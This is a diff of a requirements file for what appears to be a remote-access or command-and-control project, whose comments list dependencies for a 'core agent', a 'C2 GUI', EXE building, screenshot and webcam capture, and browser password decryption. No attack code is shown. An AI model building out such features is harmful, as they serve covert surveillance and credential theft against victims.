@@ -1,7 +1,8 @@
-# Core: no dependencies required (stdlib only)
-# Optional per-plugin dependencies (install only what you need):
-  pip install pyinstaller        # Build EXEs
-  pip install mss pillow         # Screenshots (Windows)
-  pip install opencv-python      # Webcam capture
-  pip install cryptography       # Browser password decryption
-pyinstaller
+# Core agent: no dependencies (stdlib only)
+# ==========================================
+# These are only needed for specific features:
+pyinstaller>=6.0          # Build standalone EXEs via builder.py
+pillow>=10.0.0            # Screenshot display in C2 GUI
+mss>=9.0.0                # Screenshot capture (alternative)
+opencv-python-headless>=4.8.0  # Webcam capture
+cryptography>=41.0.0      # Browser password decryption
